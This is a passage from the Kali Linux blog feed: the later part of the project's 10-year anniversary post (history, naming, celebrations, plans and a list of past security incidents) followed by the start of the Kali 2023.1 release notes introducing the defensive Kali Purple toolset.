bottlenecks points. Another upside of this was to allow people to get source code of packages .</p> <p>The team had really never used Ubuntu before, as a result, took multiple attempts to get a functioning eco-system (may not stretch as far as saying working systems!). This time, we did not want to make this mistake again, so we consulted the guy who <em>literally</em> wrote the Debian handbook to get his advice and guidance to understand Debian&rsquo;s way of doing things correctly from day 1.</p> <p>We also setup dedicated build boxes, on various different architecture (as we wanted to support ARM). This allowed us for &ldquo;CI/CD&rdquo; for packages being built automatically, as well as nightly testing of images and system upgrades. We also setup unit testing for packages, allowing for testing to happen when importing from Debian.</p> <p><strong>Setup</strong></p> <p>We knew how important it was to have a functioning setup process, and it needs to be able to cover a lot of different scenarios. With the switch to Debian, we were able to add:</p> <ul> <li>Full language support - Kali is not limited to English!</li> <li>Accessibility support - We were contacted by multiple blind penetration testers</li> <li>Straight to setup - We could now install straight from grub without having to boot into a live environment first</li> </ul> <p><strong>Summary</strong></p> <p>Debian was picked as its one of the largest Linux distributions, community driven (thus open-source), and supports many different architectures &amp; hardware. Rather than using an OS which is forked from Debian, thus adds another layer of complexity of who is &ldquo;upstream,&rdquo; it makes sense to go straight to the source. Then following Debian standards &amp; polices had huge advantages for us.</p> <p>The downside would mean a complete redesign &amp; restructure. And we mean a complete re-do over. Everything from our infrastructure (package &amp; image build bots, network mirror handling etc), the base operating system, our packages. Complete re-write. We stop focusing on BackTrack to focus secretly working away on Kali which took over a year.</p> <p>Needless to say, it was a LOT of work, but it was completely worth doing it. Both from development team, streamlining so many aspects to giving a greater improvement to user experience.</p> <hr> <p>If you want even more, you can look at at the original blog posts, as well as watch some <a href="https://www.kali.org/blog/10-years/#talks">talks</a> about it:</p> <ul> <li><a href="https://www.offsec.com/offsec/backtrack-reborn-kali-linux/">BackTrack Reborn  Kali Linux</a></li> <li><a href="https://www.kali.org/blog/kali-linux-1-0-0-release/">Kali Linux 1.0 Release - Moto - The Birth of Kali Linux</a></li> <li><a href="https://www.kali.org/blog/kali-linux-whats-new/">What&rsquo;s New in Kali Linux?</a></li> </ul> <h3 id="kalis-name">Kali&rsquo;s Name</h3> <p><strong>Why is the name &ldquo;Kali Linux&rdquo;?</strong></p> <p>&ldquo;Kali&rdquo; was already a part of a team members vocabulary, and when it was put forwards internally, everyone liked it. There are various incorrect claims online of why we picked it (such as it standing for something) but really, we just liked it. Yes, it also means &ldquo;strong&rdquo; in Swahili, and is also a Hindu goddess. <strong>We. Just. Liked it.</strong></p> <p><strong>How did you pick the name?</strong></p> <p>When coming up with the name, we knew we needed something that was cool, catchy, and unique. We did not want to step on any other projects toes in infosec realm, or even IT in general.</p> <p>One evening at a Black Hat USA, the team was sitting around and trying to come up with a new name. They started coming up with initials of phrases, or merging abbreviations and even looked at coming up with a completely new word. Without any success, one of the team members instinctively went to what they do when naming a new pet; Pantheon names. After making a list of of various Deities from as many mythologies, the team started looking up to see which had not yet been used in the Industry. Whilst there was a few terms the team really like, they were already in use by other projects. After looking up over 70 suggestions, only one really stood out, &ldquo;Kali&rdquo;. Kali is a Hindu Goddess of &ldquo;Destruction and Rebirth&rdquo;. It could not have been any better fitting; with one project ending, a new one starting. One of the team members ears twitched when they heard it as a suggestion, as they spoke Swahili, where &ldquo;Kali&rdquo; means &ldquo;Strong&rdquo;. After a little bit more understanding of the word, there is also a martial art also called &ldquo;Kali&rdquo;. Its style? All offense, no defense. It felt like it was a sign, everything was pointing to &ldquo;Kali&rdquo;. It was the only name which came up strong, and there was not a reason not to use it. The team stopped the hunt for a name.</p> <p>The word Kali has a lot of meaning to many different people. <em>Everyone is right, as it means something different to everyone.</em> <strong>We. Just. Liked it.</strong></p> <h3 id="screenshot-tour">Screenshot Tour</h3> <p>They say &ldquo;a picture is worth a thousand words&rdquo;, so here is a trip down memory lane that&rsquo;s worth £59,000:</p> <ul> <li>Whoppix 2.x (<a href="images/Whoppix2-1.png">#1</a>, <a href="images/Whoppix27-1.png">#2</a>, <a href="images/Whoppix27-2.png">#3</a>, <a href="images/Whoppix27-3.png">#4</a>, <a href="images/Whoppix27-4.png">#5</a>)</li> <li>Whax 3.0 (<a href="images/Whax3-1.png">#1</a>, <a href="images/Whax3-2.png">#2</a>, <a href="images/Whax3-3.png">#3</a>, <a href="images/Whax3-5.png">#4</a>, <a href="images/Whax3-5.png">#5</a>, <a href="images/Whax3-6.png">#6</a>)</li> <li>BackTrack 1 (<a href="images/BackTrack1-1.png">#1</a>, <a href="images/BackTrack1-2.png">#2</a>, <a href="images/BackTrack1-3.png">#3</a>, <a href="images/BackTrack1-wallpaper.jpg">Wallpaper</a>)</li> <li>BackTrack 2 (<a href="images/BackTrack2-1.png">#1</a>, <a href="images/BackTrack2-2.png">#2</a>, <a href="images/BackTrack2-3.png">#3</a>)</li> <li>BackTrack 3 (<a href="images/BackTrack3-1.png">#1</a>, <a href="images/BackTrack3-2.png">#2</a>, <a href="images/BackTrack3-3.png">#3</a>, <a href="images/BackTrack3-wallpaper1.jpg">Wallpaper #1</a>, <a href="images/BackTrack3-wallpaper2.png">Wallpaper #2</a>)</li> <li>BackTrack 4 (<a href="images/BackTrack4-1.png">#1</a>, <a href="images/BackTrack4-2.png">#2</a>, <a href="images/BackTrack4-3.png">#3</a>, <a href="images/BackTrack4-4.png">#4</a>)</li> <li>BackTrack 5 (<a href="images/BackTrack5-1.png">#1</a>, <a href="images/BackTrack5-2.png">#2</a>, <a href="images/BackTrack5-3.png">#3</a>)</li> <li>Kali 1.0.x (<a href="images/Kali1.0-1.png">#1</a>, <a href="images/Kali1.0-2.png">#2</a>)</li> <li>Kali 1.1.x (<a href="images/Kali1.1-1.png">#1</a>, <a href="images/Kali1.1-2.png">#2</a>)</li> <li>Kali 2.x (<a href="images/Kali2.0-1.png">#1</a>, <a href="images/Kali2.0-2.png">#2</a>, <a href="images/Kali2.0-3.png">#3</a>)</li> <li>Kali 2019.4 (<a href="images/Kali2019.4-1.png">#1</a>, <a href="images/Kali2019.4-2.png">#2</a>, <a href="images/Kali2019.4-3.png">#3</a>, <a href="images/Kali2019.4-4.png">#4</a>)</li> <li>Kali 2020.2 (<a href="images/Kali2020.2-1.png">#1</a>, <a href="images/Kali2020.2-2.png">#2</a>, <a href="images/Kali2020.2-3.png">#3</a>, <a href="images/Kali2020.2-4.png">#4</a>)</li> <li>Kali 2020.4 (<a href="images/Kali2020.4-1.png">#1</a>, <a href="images/Kali2020.4-2.png">#2</a>)</li> <li>Kali 2021.2 (<a href="images/Kali2021.2-1.png">#1</a>, <a href="images/Kali2021.2-2.png">#2</a>)</li> <li>Kali 2022.1 (<a href="images/Kali2022.1-1.png">#1</a>, <a href="images/Kali2022.1-2.png">#2</a>, <a href="images/Kali2022.1-3.png">#3</a>)</li> <li>Kali 2023.1 (<a href="images/Kali2023.1-1.png">#1</a>, <a href="images/Kali2023.1-2.png">#2</a>, <a href="images/Kali2023.1-3.png">#3</a>, <a href="images/Kali2023.1-4.png">#4</a>, <a href="images/Kali2023.1-5.png">#5</a>)</li> <li>Shells (<a href="images/shell-history.png">#1</a>)</li> </ul> <h2 id="today-the-present">Today: The Present</h2> <p>And today, we have some presents to share with you! We are celebrating 10 years, with various different items.</p> <p><p> <a href='https://www.kali.org/blog/10-years/images/kali-cake-transparent.png'> <img src="https://www.kali.org/blog/10-years/images/kali-cake-transparent.png" alt="" /> </a> </p> </p> <h3 id="kali-20231">Kali 2023.1</h3> <p>First up, was the release of <a href="https://www.kali.org/blog/kali-linux-2023-1-release/">Kali 2023.1</a>. We managed to release exactly on the 10 year anniversary date! We try and not publicly give release dates, as there are many moving parts (outside of our control). This release was no exception, with multiple things breaking daily (Debian installer when trying to build the final RC image, Hugo image altering in our CI pipeline, and fall out from Python 3.11).</p> <p><p> <a href='https://www.kali.org/blog/10-years/images/Kali2023.1-3.png'> <img src="https://www.kali.org/blog/10-years/images/Kali2023.1-3.png" alt="Kali 2023.1" /> </a> </p> </p> <p>With this comes various features and changes, include the initial technical preview launch of &ldquo;Kali Purple&rdquo;. Kali has been doing 10 years of offensive (18.5 from Whoppix!), now Kali is starting to help the defensive side. You can read more about it in the release notes of <a href="https://www.kali.org/blog/kali-linux-2023-1-release/">Kali 2023.1</a>, <a href="https://gitlab.com/kalilinux/kali-purple/documentation">Kali Purple&rsquo;s documentation</a>, as well as watch the following talk from <a href="https://www.youtube.com/watch?v=3UMxOsdexK8">Adversary Village at RSAC 2023</a>.</p> <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;"> <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="allowfullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.kali.org/blog/10-years/https://www.youtube-nocookie.com/embed/3UMxOsdexK8?autoplay=0&controls=1&end=0&loop=0&mute=0&start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video" ></iframe> </div> <h3 id="online-puzzle">Online Puzzle</h3> <p>We also have an online event in the form of a Jeopardy Capture The Flag (CTF) happening over at <a href="https://10year.kali.org/">10year.kali.org</a>. The puzzles are designed by the same people who where the first to solve the TV show Mr. Robot &ldquo;Alternate Reality Game&rdquo; (ARG) - <a href="https://www.kali.org/blog/mr-robot-arg-society/">Mr. Robot ARG Society</a>. Enjoy and hope it keeps you busy for a while!</p> <p>This challenge will only be &ldquo;online&rdquo; for two weeks, but we will offer it up afterwards to be able to download and run offline. <em>Check back on <a href="https://10year.kali.org/">10year.kali.org</a> after closing to get the instructions.</em></p> <h3 id="song">Song</h3> <p>We have once again worked with Uzimon, and now have a Kali tune! Give <code>Going Back to Kali</code> a listen to, and feel free to download, use, and remix. Enjoy!</p> <p><a href="audio/Uzimon%20-%20Going%20Back%20To%20Kali.mp3">Audio (mp3)</a>, <a href="videos/Uzimon%20-%20Going%20Back%20To%20Kali.mp4">Video (mp4)</a> and <a href="static/Uzimon%20-%20Going%20Back%20To%20Kali.txt">Lyrics</a></p> <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;"> <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="allowfullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.kali.org/blog/10-years/https://www.youtube-nocookie.com/embed/LycUI0mBWiw?autoplay=0&controls=1&end=0&loop=0&mute=0&start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video" ></iframe> </div> <p>In case you <a href="https://www.kali.org/blog/kali-linux-1-1-0-release/">missed</a> the first songs:</p> <ul> <li>OffSec: <a href="https://www.offsec.com/offsec/say-try-harder/">Uzimon - OffSec Say Try Harder!</a> </li> <li>OffSec: <a href="https://www.offsec.com/offsec/happy-holidays-from-offsec/">Uzimon - Call OffSec</a></li> <li>BackTrack: <a href="https://web.archive.org/web/20170606153104/http://www.backtrack-linux.org:80/backtrack/backtrack-5-are-you-infected-yet/">Infected Mushroom - Project 100</a></li> </ul> <h3 id="sneakers">Sneakers</h3> <p>Kali is now going sneakernet! No, really! We have Kali on sneakers.</p> <p>This is a very unique and a collectors item. These are Jordans, with Italian Nubuck and genuine Python <em>(not Python 3.11, but the real thing!)</em>. As these are for a limited time, as well as being handmade item, <em>do expect the price tag to match it</em>. Please note: we are not on commission, we are not getting a cut of any sales price. 100% is going to the shoe maker.</p> <p><del>You can put your pre-order in here</del> <strong>No longer taking orders</strong>. <a href="https://web.archive.org/web/20230316175151/https://hvnd.studio/products/kali-pre-order">You can view the mock ups still</a>.</p> <p><p> <a href='https://www.kali.org/blog/10-years/images/kali-shoe.jpg'> <img src="https://www.kali.org/blog/10-years/images/kali-shoe.jpg" alt="Kali Shoe" /> </a> </p> </p> <h3 id="pen-200pwk-refresh">PEN-200/PWK Refresh</h3> <p>From an OffSec side of things, they have had a trick up their sleeve and launched the refreshed <a href="https://www.offsec.com/courses/pen-200/">PEN-200 (Pentesting With Kali)</a> course. Everything from <a href="https://www.offsec.com/wp-content/uploads/2023/03/V1.Regular-Syllabus-PDF.pdf">new material</a> to a new format style of lab machines, but still keeping OSCP certificate.</p> <p>For more information, please see <a href="https://www.offsec.com/offsec/pen-200-2023/">their blog</a> post, <a href="https://www.offsec.com/wp-content/uploads/2023/03/pen200-ebook-2023.pdf">PDF</a>, and <a href="https://help.offsec.com/hc/en-us/articles/12483872278932-PEN-200-FAQ">FAQs</a>.</p> <h3 id="amas">AMAs</h3> <p>Not only did we also do what has became our normal post-launch <a href="https://discord.kali.org/">Discord</a> session, we also did a <a href="https://www.reddit.com/r/offensive_security/comments/11swldq/hi_im_g0tm1lk_lead_developer_for_kali_linux/">&ldquo;Ask Me Anything&rdquo; (AMA)</a>, over on Reddit last week. You can read back over people&rsquo;s questions and the teams answers.</p> <p>If you missed it and you have any burning questions you would like the team to answer, feel free to stop by for the next Discord session. We are aiming to schedule them the first Tuesday after each Kali release. See you for Kali 2023.2!</p> <hr> <p>Unfortunately, due to time constraints and personal events, we were unable to get our &ldquo;kali4kids&rdquo; ready in time. We were hoping to have this year&rsquo;s special something early, but rather than rushing and reducing the quality, we are delaying it. Trust us, its going to be worth the wait. <em>Its also not an April Fools, its not being released on 1st April - promise!</em></p> <h2 id="tomorrow-the-future">Tomorrow: The Future</h2> <p>So, where do we see Kali in the next 10 years? Good question! In short: <em>We do not know.</em></p> <p>10 years ago we could not have predicted where we are today. And the same goes for now, we cannot predict the next 10 years.</p> <p>What we can say is, we will continue with what we have already done and be responsive to the industry, pentesting, &amp; market with how it develops over time with the goal of being at the forefront.</p> <hr> <p>We need to be responsive to items which come up. Both from an upstream side of things (Debian), as well as the infosec industry.</p> <p>With software, code gets updated. A perfect recent example of that is Python. Debian is getting ready to do its next stable release this summer. As a result, there are <a href="https://release.debian.org/bookworm/freeze_policy.html">various stages</a> in the release cycle to make this happen. Package maintainers are trying to make sure they have the latest version in, and as bug free as possible. Python is such a core part of an OS as so many scripts and packages rely on it, it is included in their first freeze. Python 3.11 has been &ldquo;rushed&rdquo; to make it into the upcoming stable release, as there are real improved performance. This then has a knock on-effect, as not everything may be compatible, either in Debian or Kali. After the updated Python was accepted, packages then get updated, pushed and tested against. There is a lot, and it does not happen all at once, but rather as each package then gets updated afterwards. As a result, bugs may trickle in as things change. <em>We also like to try and keep as close to Debian as possible, expect for where it makes sense to benefit us and our users. This means we can put more time into doing things that make Kali&hellip; Kali!</em></p> <p>With technology, trends change. Live-CD were once &ldquo;the in thing&rdquo;, then persistent USB was &ldquo;it&rdquo;, which moved onto VMs, which gave way to containers, and currently &ldquo;cloud&rdquo; is in. Who knows what&rsquo;s next!</p> <p>In infosec, trends change as technology changes, software stacks change, attack surface changes, and defenses improve. As a result, we need to be able to adapt. At one stage, Wireless hacking &ldquo;was the thing&rdquo;, so we needed to support injection on as many cards as possible. Today, it is more &ldquo;Command and Control&rdquo;, &ldquo;Cloud&rdquo;, &ldquo;Living off the Land&rdquo;, and &ldquo;Endpoint Detection and Response&rdquo;. We do not know what tomorrow will bring, but we need to be ready to react to it.</p> <hr> <p>We have built up various internal technical debt, that we need to pay off. <em>Luckily nothing is more than 10 years old!</em></p> <p>An item which we are able to talk about, is switching out our mirror redirector to a newer solution. We have had this since the start of Kali, and whilst it does work, it is becoming more feature limiting and unable to integrate with newer stacks.</p> <p>Refreshing our CI solution we are using for our image building is another item which is long overdue. This will help detect build issues with our images and platforms quicker.</p> <p>Once we have reduced as much of the debt as we can, we will be in a much stronger position to be able to push forwards, and quicker than if we were to do any future items now. We are aiming then to ride on the development momentum, to build excitement up in the community.</p> <hr> <p>Like Kali Purple, Kali is going defensive. This is a new area for Kali, currently we have only scratched the surface. We want to go deeper and break into more infosec areas as well!</p> <p>We are looking for ideas and suggestions to please come and get involved with what you would like to see Kali Purple turn into.</p> <hr> <p>Kali is an Open-Source project. Previously we have been doing things behind closed doors, but we have been doing more in the public eye. But we can do more. We want to do even more in the open as possible. We are wanting to feed and help community contributions grow.</p> <hr> <p>&hellip;One thing that is certain however, we do not plan on changing the projects name. Kali is here to stay!</p> <h2 id="timelines">Timelines</h2> <p>Over the years there has been some activity in different areas. Below we have pieced together some things which may be of interest to some of you.</p> <h3 id="talks">Talks</h3> <p>Over the years, the team has given various different talks about the projects. They could be more of a deep dive of a certain platform or feature, but below are ones more of a higher level overview:</p> <ul> <li>2013-07-17: <a href="https://www.youtube.com/watch?v=zflPxpmxk-o">OISF 2013 Martin Bos Kali Linux Backtrack Linux reborn</a> @ Ohio Information Security Forum </li> <li>2017-12-05: <a href="https://www.youtube.com/watch?v=E-rs7OXH7Ls">Kali Linux&rsquo;s Experience of a Derivative Tracking Debian Testing</a> @ Debconf 16</li> </ul> <h3 id="trailer-videos">Trailer Videos</h3> <p>Over the years, we have done videos to show off the project. Here is a collection:</p> <ul> <li>2011-05-05: <a href="https://vimeo.com/23347352">BackTrack 5 - Penetration Testing Distribution</a></li> <li>2013-01-19: <a href="https://vimeo.com/57742213">BackTrack Reborn - Kali Linux Teaser</a></li> <li>2015-07-01: <a href="https://vimeo.com/132329259">Kali 2.0 Teaser - Kali Sana</a></li> <li>2017-08-22: <a href="https://vimeo.com/346920378">Kali 2017.1 - KDE Desktop Fun</a></li> </ul> <h3 id="hacked">Hacked</h3> <p>We know everyone is a target, but also being apart of the industry we paint ourselves as a bigger target. From time-to-time we have made slip ups. Lucky, as far as we know, it never has been anything major, critical or user-facing:</p> <ul> <li>2010-12-25: &ldquo;Happy Ninja&rdquo; low privileged shell by compromising another vHost on the same machine via an outdated vBulletin plug-in <ul> <li>Their eZine: <a href="https://www.exploit-db.com/papers/15823">Owned and Exposed #2</a></li> </ul> </li> <li><em>2012-04-11 - Invalid <a href="https://web.archive.org/web/20120414172307/http://www.backtrack-linux.org:80/backtrack/backtrack-0day-privilege-escalation">0-day privilage escalation in BackTrack</a> advisory</em> <ul> <li><em>Really, it was WICD privilege escalation, BackTrack was already running as root, and it was more of a PR stunt</em></li> </ul> </li> <li>2013-05-01: OffSec launches Bug Bounty program, covering Kali Linux</li> <li>2014-04-30: &ldquo;The GreaT TeAm (TGT)&quot;&rsquo;s defacement of <code>lists.kali.org</code> (via Heartbleed/CVE-2014-0160) <ul> <li>Low traffic, rarely used 3rd party hosted public mailing list</li> </ul> </li> <li>2016-03-31: &ldquo;Team Bad Dream&rdquo; gained moderation privileges on <code>forums.kali.org</code> (socially engineered), which lead to failed defacement on <code>bugs.kali.org</code> (suspect re-used credentials) <ul> <li>Also suspect impersonating user on IRC (failed attempt at requesting additional access to new services)</li> <li>Limited only to community support portals</li> </ul> </li> <li>2021-12-08: &ldquo;0x0 keeper&rdquo; used CVE-2021-43798 Grafana directory traversal (via OffSec&rsquo;s bug bounty program) <ul> <li>Used for system monitoring and alerts</li> </ul> </li> </ul> <h3 id="april-fools">April Fools</h3> <p>We like a bit of fun, and have been known to pull pranks over the years:</p> <ul> <li>2010-04-01: <a href="https://web.archive.org/web/20100407115253/http://www.backtrack-linux.org:80/backtrack/aircrack-ng-aquired-by-the-backtrack-team">Backcrack-ng v1.1</a> </li> <li>2021-04-01: <a href="https://twitter.com/kalilinux/status/1377659731913871362">kali4kids</a></li> <li>2022-04-01: <a href="https://www.kali.org/blog/kali-linux-2022-2-release/">Hollywood mode</a></li> </ul> <h4 id="kali4kids">Kali4Kids</h4> <p>What <a href="https://www.kali.org/blog/kali-everywhere/">started out as a poster</a> put out by a government agency that <a href="https://www.zdnet.com/article/uk-police-distance-themselves-from-poster-warning-parents-to-report-kids-for-using-kali-linux/">did not give the message they were expecting</a>.</p> <p>In response, the community started to share how <a href="https://twitter.com/kalilinux/status/1229906554079645696">Kali is for the children</a>. With how much it was being used, it was shortened to &ldquo;Kali For Kids&rdquo;. So we figured, <a href="https://web.archive.org/web/20210401163106/https://kids.kali.org/">what would Kali look like IF it was made for kids</a>.</p> <p>&ldquo;kali4kids&rdquo; then became the internal name for next year&rsquo;s April Fools joke. We have got enough ideas for things we want to try all the way to 2039!</p> <h3 id="kali-dojo">Kali Dojo</h3> <p>The term &ldquo;Dojo&rdquo; relates to the martial arts, where you practised it. As there has always been a underlying theme of martial arts, it felt right to use. Kali dojo, was a series of workshops given at mostly conferences. They would be hands on exercises, doing features with the OS that makes Kali, Kali:</p> <ul> <li>2014-08-07: <a href="https://www.blackhat.com/us-14/kali-linux-dojo.html">Black Hat USA 2014</a></li> <li>2014-09-24: <a href="http://2014.brucon.org/index.php/Training_Kali_Linux_Dojo.html">BruCon 2014</a></li> <li>2014-09-27: <a href="https://www.youtube.com/watch?v=EhKeNfldif8&amp;t=684s">DerbyCon 2014</a> </li> <li>2015-08-05: <a href="https://www.blackhat.com/us-15/briefings.html#the-kali-linux-dojo-workshop-#1-rolling-your-own-generating-custom-kali-linux-20-isos">Black Hat USA 2015</a> </li> <li>2015-08-07: <a href="https://defcon.org/html/defcon-23/dc-23-kali-dojo.html">DEF CON 23</a> </li> <li>2016-03-24: <em><a href="https://www.offsec.com/offsec/what-it-means-to-be-an-oscp-reloaded/">IRC</a></em></li> <li>2016-08-04: <a href="https://www.blackhat.com/us-16/kali-linux.html">Black Hat USA 2016</a> </li> <li>2016-08-31: <a href="https://ekoparty.blogspot.com/2016/08/the-kali-linux-dojo-penetration-testing.html">Ekoparty 12</a> </li> <li>2017-07-27: <a href="https://www.blackhat.com/us-17/kali-linux.html">Black Hat USA 2017</a> </li> <li>2017-07-29: <a href="https://www.wallofsheep.com/blogs/news/introducing-hands-on-workshops-at-the-packet-hacking-village#kalilinux">DEF CON 25</a> </li> <li>2018-08-09: <a href="https://twitter.com/kalilinux/status/1027599759257743360">Black Hat USA 2018</a> </li> <li>2018-08-11: <a href="https://www.wallofsheep.com/pages/dc26#jlong">DEF CON 26</a> </li> <li>2018-10-25: <a href="https://wwhf18.sched.com/event/Foa3/workshop-kali-linux-dojo-registration-required">Wild West Hackin&rsquo; Fest 2018</a> </li> <li>2018-03-21: <a href="https://web.archive.org/web/20171116235734/http://infosecworld.misti.com/agenda/agenda-at-a-glance">InfoSec World 2018</a> </li> </ul> <p>Online videos of 2015 dojos:</p> <ul> <li>2015-02-25: <a href="https://vimeo.com/120611508">Kali Dojo 02 - Building Custom Kali ISOs using Live Build</a></li> <li>2015-02-26: <a href="https://vimeo.com/120724441">Kali Dojo 03 - Kali Linux USB Persistence &amp; Encryption</a></li> <li>2015-03-06: <a href="https://vimeo.com/121449299">Kali Dojo 04 - Kali on a Raspberry Pi with LUKS Disk Encryption</a></li> </ul></description>
</item>
<item>
<title>Kali Linux 2023.1 Release (Kali Purple & Python Changes)</title>
<link>https://www.kali.org/blog/kali-linux-2023-1-release/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-2023-1-release/</guid>
<pubDate>Mon, 13 Mar 2023 00:00:00 +0000</pubDate>
<enclosure url="https://www.kali.org/blog/kali-linux-2023-1-release/images/banner-2023.1-release.jpg" type="image/jpg"/>
<description><p>Today we are releasing Kali 2023.1 (and on our <strong>10th anniversary</strong>)! It will be ready for immediate <a href="https://www.kali.org/get-kali/">download</a> or <a href="https://www.kali.org/docs/general-use/updating-kali/">updating</a> by the time you have finished reading this post.</p> <p>Given its our 10th anniversary, we are delighted to announce there are a few special things lined up to help celebrate. Stay tuned for a blog post coming out for more information! Edit: <a href="https://www.kali.org/blog/10-years/">Its out</a>!</p> <p>The <a href="https://bugs.kali.org/changelog_page.php">changelog</a> summary since the <a href="https://www.kali.org/blog/kali-linux-2022-4-release/">2022.4 release from December</a>:</p> <ul> <li><strong><a href="https://www.kali.org/blog/kali-linux-2023-1-release/#kali-purple">Kali Purple</a></strong> - The dawn of a new era. Kali is not only Offense, but starting to be defense</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2023-1-release/#python-updates--changes">Python Changes</a></strong> - Python 3.11 &amp; PIP changes going forward</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2023-1-release/#2023-theme-refresh">2023 Theme</a></strong> - Our once a year theme update! This time, what&rsquo;s old is new again</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2023-1-release/#desktop-updates">Desktop Updates</a></strong> - Xfce 4.18 &amp; KDE Plasma 5.27</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2023-1-release/#default-kernel-settings">Default Kernel Settings</a></strong> - What makes the Kali kernel different</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2023-1-release/#new-tools-in-kali">New Tools</a></strong> - As always, various new tools added</li> </ul> <hr> <h2 id="kali-purple">Kali Purple</h2> <blockquote> <p><em><strong>We are leveling the playing field</strong>!</em></p> </blockquote> <p>Over the years, we have perfected what we have specialized in, offensive security. We are now starting to branch into a new area, defensive security! We are doing an initial technical preview pre-launch of &ldquo;Kali Purple&rdquo;. This is still in its infancy and is going to need time to mature. But you can start to see the direction Kali is expanding into. You can also be a part of helping to shape the direction!</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2023-1-release/images/kali-purple-icon.svg'> <img src="https://www.kali.org/blog/kali-linux-2023-1-release/images/kali-purple-icon.svg" alt="Kali Purple" /> </a> </p> </p> <hr> <p><strong>What is Kali Purple?</strong></p> <p>The one stop shop for blue and purple Teams.</p> <blockquote> <p><em>Feeling red? Feeling blue?</em> Kali Purple: You do You!</p> </blockquote> <p>Remember what we did a decade ago with Kali Linux? Or with <a href="https://www.backtrack-linux.org/">BackTrack</a> before that? We made offensive security accessible to everyone. No expensive licenses required, no need for commercial grade infrastructure, no writing code or compiling tools to make it all work&hellip; Just download Kali Linux and do your thing.</p> <p>We are excited to start a new journey with the mission to do exactly the same for defensive security: Just download Kali Purple and do your thing.</p> <p>Kali Purple is starting out as a Proof of Concept, evolving into a framework, then a platform <em>(just like how Kali is today)</em>. The goal is to make enterprise grade security accessible to everyone.</p> <hr> <p><strong>What is in Kali Purple?</strong></p> <p>On a higher level, Kali Purple consists of:</p> <ul> <li>A reference architecture for the ultimate SOC In-A-Box; perfect for: <ul> <li>Learning</li> <li>Practicing SOC analysis and threat hunting</li> <li>Security control design and testing</li> <li>Blue / Red / Purple teaming exercises</li> <li>Kali spy vs. spy competitions ( bare knuckle Blue vs. Red )</li> <li>Protection of small to medium size environments</li> </ul> </li> <li>Over 100 defensive tools, such as: <ul> <li><a href="https://pkg.kali.org/pkg/arkime">Arkime</a> - Full packet capture and analysis</li> <li><a href="https://pkg.kali.org/pkg/cyberchef">CyberChef</a> - The cyber swiss army knife</li> <li><code>Elastic Security</code> - Security Information and Event Management</li> <li><a href="https://www.kali.org/tools/gvm/">GVM</a> - Vulnerability scanner</li> <li><a href="https://pkg.kali.org/pkg/thehive">TheHive</a> - Incident response platform</li> <li><code>Malcolm</code> - Network traffic analysis tool suite</li> <li><a href="https://pkg.kali.org/pkg/suricata">Suricata</a> - Intrusion Detection System</li> <li><a href="https://pkg.kali.org/pkg/zeek">Zeek</a> - (another) Intrusion Detection System <em>(both have their use-cases!)</em></li> <li><em>&hellip;and of course all the usual <a href="https://www.kali.org/tools/">Kali tools</a></em></li> </ul> </li> <li>Defensive tools <a href="https://gitlab.com/kalilinux/kali-purple/documentation">documentations</a></li> <li><a href="https://www.kali.org/get-kali/">Pre-generated image</a></li> <li>Kali Autopilot - an attack script builder / framework for automated attacks </li> <li>Kali Purple Hub for the community to share: <ul> <li>Practice pcaps</li> <li>Kali Autopilot scripts for blue teaming exercises</li> </ul> </li> <li><a href="https://gitlab.com/kalilinux/kali-purple/documentation/-/wikis/home">Community Wiki</a></li> <li>A defensive menu structure according to NIST CSF (National Institute of Standards and Technology Critical Infrastructure Cybersecurity): <ul> <li>Identify</li> <li>Protect</li> <li>Detect</li> <li>Respond</li> <li>Recover</li> </ul> </li> <li>Kali Purple <a href="https://discord.kali.org/">Discord</a> channels for community collaboration and fun</li> <li>And theme: installer, menu entries &amp; Xfce!</li> </ul> <p>&hellip;And this is just the beginning of our journey.</p> <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;"> <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="allowfullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.kali.org/blog/kali-linux-2023-1-release/https://www.youtube-nocookie.com/embed/3UMxOsdexK8?autoplay=0&controls=1&end=0&loop=0&mute=0&start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video" ></iframe> </div> <h3 id="screenshots">Screenshots</h3> <p>This is what it looks like. Some defensive tools:</p> <p><strong>Elastic SIEM</strong>:</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2023-1-release/images/Elastic-01-Dashboard-OPNsense.png'> <img src="https://www.kali.org/blog/kali-linux-2023-1-release/images/Elastic-01-Dashboard-OPNsense.png" alt="Elastic SIEM" /> </a> </p> </p> <p><strong>Arkime</strong>:</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2023-1-release/images/Malcolm-01-Arkime.png'> <img src="https://www.kali.org/blog/kali-linux-2023-1-release/images/Malcolm-01-Arkime.png" alt="Arkime" /> </a> </p> </p> <p><strong>Malcolm</strong>:</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2023-1-release/images/Malcolm-10-Dashboard.png'> <img src="https://www.kali.org/blog/kali-linux-2023-1-release/images/Malcolm-10-Dashboard.png" alt="Malcolm" /> </a> </p> </p> <p><strong>Installer, menu, and Xfce</strong>:</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2023-1-release/images/Kali-Purple_installer.png'> <img src="https://www.kali.org/blog/kali-linux-2023-1-release/images/Kali-Purple_installer.png" alt="Kali Purple installer" /> </a> </p> </p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2023-1-release/images/Kali-Purple_menu.png'> <img 